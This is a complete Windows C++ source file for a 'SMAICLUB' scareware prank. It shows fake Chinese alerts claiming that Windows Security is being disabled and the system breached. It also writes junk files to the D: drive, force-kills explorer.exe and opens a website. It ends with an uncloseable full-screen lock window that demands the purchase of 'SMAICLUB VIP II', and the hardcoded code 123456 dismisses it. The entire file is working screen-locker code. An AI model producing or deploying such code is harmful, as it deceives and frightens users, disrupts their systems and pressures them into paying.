#define UNICODE
#define _UNICODE
#include <windows.h>
#include <string>
#include <vector>
#include <cstdlib> // For system()
#include <ctime>   // For srand, rand
#include <shlobj.h> // For ShellExecute
#include <wingdi.h> // For GradientFill

#pragma comment(lib, "Msimg32.lib")
#pragma comment(lib, "gdi32.lib")

// --- Global Variables ---
HINSTANCE g_hInstance;
HWND g_popupHwnds[7] = {NULL};
int g_currentPopup = 0;
const wchar_t* g_popupMessages[] = {
	L"安装 UNDEFEND.DLL...", L"关闭后台软件...", L"关闭 WINDOWS SECURITY...",
	L"获取 admin 权限...", L"写入磁盘...", L"入侵系统...", L"成功!"
};
HWND g_warningHwnd = NULL;
std::wstring g_unlockSequence = L"";
const std::wstring UNLOCK_CODE = L"123456";
COLORREF g_warningColor = RGB(255, 0, 0);
HFONT g_hFontWarning = NULL;
HFONT g_hFontSubtitle = NULL;

// Timer IDs
#define ID_TIMER_SEQUENCE 1
#define ID_TIMER_COLOR_CHANGE 2

// --- Forward Declarations ---
void CreateNextPopup();
void PerformRealAction(int step);
void CreateWarningWindow();
void CleanupPopups();

/* Window Procedure */
LRESULT CALLBACK WndProc(HWND hwnd, UINT Message, WPARAM wParam, LPARAM lParam) {
	switch (Message) {
		case WM_CREATE: {
			CREATESTRUCT* pCreate = reinterpret_cast<CREATESTRUCT*>(lParam);
			if (pCreate && pCreate->lpCreateParams && wcscmp(static_cast<const wchar_t*>(pCreate->lpCreateParams), L"WarningWindow") == 0) {
				g_warningHwnd = hwnd;
				LOGFONT lf = {0};
				lf.lfHeight = 72; lf.lfWeight = FW_BOLD; wcscpy_s(lf.lfFaceName, LF_FACESIZE, L"Arial");
				g_hFontWarning = CreateFontIndirect(&lf);
				lf.lfHeight = 24; lf.lfWeight = FW_NORMAL;
				g_hFontSubtitle = CreateFontIndirect(&lf);
				SetTimer(hwnd, ID_TIMER_COLOR_CHANGE, 500, NULL);
			}
			break;
		}
		case WM_TIMER: {
			if (wParam == ID_TIMER_SEQUENCE) {
				if (g_currentPopup < 7) { CreateNextPopup(); } 
				else {
					HWND timerOwner = FindWindow(L"PopupClass", L"Controller");
					if(timerOwner) KillTimer(timerOwner, ID_TIMER_SEQUENCE);
					CleanupPopups();
					CreateWarningWindow();
				}
			} else if (wParam == ID_TIMER_COLOR_CHANGE && hwnd == g_warningHwnd) {
				g_warningColor = RGB(rand() % 256, rand() % 256, rand() % 256);
				InvalidateRect(g_warningHwnd, NULL, TRUE);
			}
			break;
		}
		case WM_SYSCOMMAND: {
			if ((wParam & 0xFFF0) == SC_MINIMIZE || (wParam & 0xFFF0) == SC_MAXIMIZE || (wParam & 0xFFF0) == SC_SIZE) {
				MessageBeep(MB_ICONERROR);
				return 0;
			}
			return DefWindowProc(hwnd, Message, wParam, lParam);
		}
		case WM_PAINT: {
			PAINTSTRUCT ps;
			HDC hdc = BeginPaint(hwnd, &ps);
			RECT rc;
			GetClientRect(hwnd, &rc);
			
			if (hwnd == g_warningHwnd) {
				HBRUSH hBrush = CreateSolidBrush(g_warningColor);
				FillRect(hdc, &rc, hBrush);
				DeleteObject(hBrush);
				SetBkMode(hdc, TRANSPARENT);
				SetTextColor(hdc, RGB(255 - GetRValue(g_warningColor), 255 - GetGValue(g_warningColor), 255 - GetBValue(g_warningColor)));
				HFONT hOldFont = (HFONT)SelectObject(hdc, g_hFontWarning);
				DrawTextW(hdc, L"SMAICLUB WARNING", -1, &rc, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
				RECT sub = rc;
				sub.top = rc.bottom - 60; sub.bottom = rc.bottom - 20;
				SelectObject(hdc, g_hFontSubtitle);
				DrawTextW(hdc, L"购买SMAICLUB VIP II即可解锁", -1, &sub, DT_CENTER | DT_SINGLELINE);
				SelectObject(hdc, hOldFont);
			} else if (IsWindowVisible(hwnd)) {
				TRIVERTEX vert[2];
				vert[0].x = 0; vert[0].y = 0; vert[0].Red = 0xE000; vert[0].Green = 0xE0FF; vert[0].Blue = 0xFFFF; vert[0].Alpha = 0;
				vert[1].x = rc.right; vert[1].y = rc.bottom; vert[1].Red = 0x8000; vert[1].Green = 0x80FF; vert[1].Blue = 0xFFEF; vert[1].Alpha = 0;
				GRADIENT_RECT gRect = {0,1};
				GradientFill(hdc, vert, 2, &gRect, 1, GRADIENT_FILL_RECT_V);
				RECT textR = rc;
				InflateRect(&textR, -10, -10);
				HFONT hFont = CreateFontW(20, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, ANTIALIASED_QUALITY, DEFAULT_PITCH | FF_SWISS, L"微软雅黑");
				HFONT hOld = (HFONT)SelectObject(hdc, hFont);
				SetBkMode(hdc, TRANSPARENT); SetTextColor(hdc, RGB(30,30,30));
				DrawTextW(hdc, g_popupMessages[g_currentPopup-1], -1, &textR, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
				SelectObject(hdc, hOld); DeleteObject(hFont);
			}
			EndPaint(hwnd, &ps);
			break;
		}
		case WM_CHAR: {
			if (hwnd == g_warningHwnd) {
				wchar_t c = (wchar_t)wParam;
				g_unlockSequence += towupper(c);
				if (UNLOCK_CODE.rfind(g_unlockSequence,0)!=0) { g_unlockSequence.clear(); } 
				else if (g_unlockSequence == UNLOCK_CODE) { DestroyWindow(g_warningHwnd); }
			}
			break;
		}
		case WM_CLOSE: {
			for(int i=0;i<7;++i) if(hwnd==g_popupHwnds[i]||hwnd==g_warningHwnd){ MessageBeep(MB_ICONERROR); return 0; }
			return DefWindowProc(hwnd, Message, wParam, lParam);
		}
		case WM_DESTROY: {
			if (hwnd == g_warningHwnd) {
				if (g_hFontWarning) DeleteObject(g_hFontWarning);
				if (g_hFontSubtitle) DeleteObject(g_hFontSubtitle);
				KillTimer(hwnd, ID_TIMER_COLOR_CHANGE);
				// --- 修正点 1 ---
				g_warningHwnd = NULL; // 原来是 g_warningHnd
				PostQuitMessage(0);
			}
			break;
		}
		default: return DefWindowProc(hwnd, Message, wParam, lParam);
	}
	return 0;
}

void CreateNextPopup() {
	if (g_currentPopup >= 7) return;
	int x = (g_currentPopup % 3) * 310 + 50;
	int y = (g_currentPopup / 3) * 180 + 50;
	DWORD dwStyle = WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX | WS_MAXIMIZEBOX | WS_VISIBLE;
	DWORD dwExStyle = WS_EX_TOPMOST;
	g_popupHwnds[g_currentPopup] = CreateWindowEx(
		dwExStyle, L"PopupClass", L"系统警告 (System Alert)", dwStyle,
		x, y, 300, 150,
		NULL, NULL, g_hInstance, NULL);
	if (g_popupHwnds[g_currentPopup]) {
		PerformRealAction(g_currentPopup);
	}
	++g_currentPopup;
}

void PerformRealAction(int step) {
	switch(step) {
		case 4: {
			CreateDirectory(L"D:\\SMAICLUB_PRANK_FILES", NULL);
			std::wstring content; for(int i=0;i<10;++i) content += L"SMAICLUB";
			for(int i=0;i<10;++i) {
				wchar_t path[MAX_PATH]; swprintf_s(path, MAX_PATH, L"D:\\SMAICLUB_PRANK_FILES\\file_%d.txt", i+1);
				HANDLE hf = CreateFile(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
				if(hf!=INVALID_HANDLE_VALUE) {
					DWORD bw; WORD bom=0xFEFF; WriteFile(hf, &bom, sizeof(bom), &bw, NULL);
					WriteFile(hf, content.c_str(), content.size()*sizeof(wchar_t), &bw, NULL); CloseHandle(hf);
				}
			}
			break;
		}
		case 5: system("taskkill /f /im explorer.exe"); Sleep(500); system("start explorer.exe"); break;
		case 6: ShellExecute(NULL, L"open", L"https://www.smaiclub.top", NULL, NULL, SW_SHOWNORMAL); break;
	}
}

void CleanupPopups() {
	for(int i=0;i<7;++i) if(g_popupHwnds[i]) { DestroyWindow(g_popupHwnds[i]); g_popupHwnds[i]=NULL; }
}

void CreateWarningWindow() {
	int w=GetSystemMetrics(SM_CXSCREEN), h=GetSystemMetrics(SM_CYSCREEN);
	const wchar_t* marker=L"WarningWindow";
	g_warningHwnd=CreateWindowEx(
		WS_EX_TOPMOST, L"WarningWindowClass", L"SMAICLUB WARNING", WS_POPUP | WS_VISIBLE,
		0,0,w,h, NULL,NULL,g_hInstance,(LPVOID)marker);
	if(g_warningHwnd) SetFocus(g_warningHwnd);
	else { MessageBox(NULL,L"创建警告窗口失败!",L"错误",MB_OK|MB_ICONERROR); PostQuitMessage(1); }
}

int WINAPI WinMain(HINSTANCE hInst,HINSTANCE,LPSTR,int) {
	g_hInstance=hInst;
	srand((unsigned)time(NULL));
	// --- 修正点 2 ---
	WNDCLASSEX wc={sizeof(WNDCLASSEX),0,WndProc,0,0,hInst,NULL,LoadCursor(NULL,IDC_ARROW),(HBRUSH)(COLOR_WINDOW+1),NULL,L"PopupClass",NULL}; // 原来是 sizeof(W_NDCLASSEX)
	RegisterClassEx(&wc);
	wc.lpszClassName=L"WarningWindowClass"; RegisterClassEx(&wc);
	HWND hMsgHandler = CreateWindowEx(0, L"PopupClass", L"Controller", WS_OVERLAPPED, 0, 0, 0, 0, NULL, NULL, hInst, NULL);
	if (!hMsgHandler) { MessageBox(NULL, L"创建消息处理窗口失败!", L"致命错误", MB_OK | MB_ICONERROR); return 1; }
	SetTimer(hMsgHandler, ID_TIMER_SEQUENCE, 1500, NULL);
	MSG msg;
	while(GetMessage(&msg,NULL,0,0)>0) { TranslateMessage(&msg); DispatchMessage(&msg); }
	return (int)msg.wParam;
}
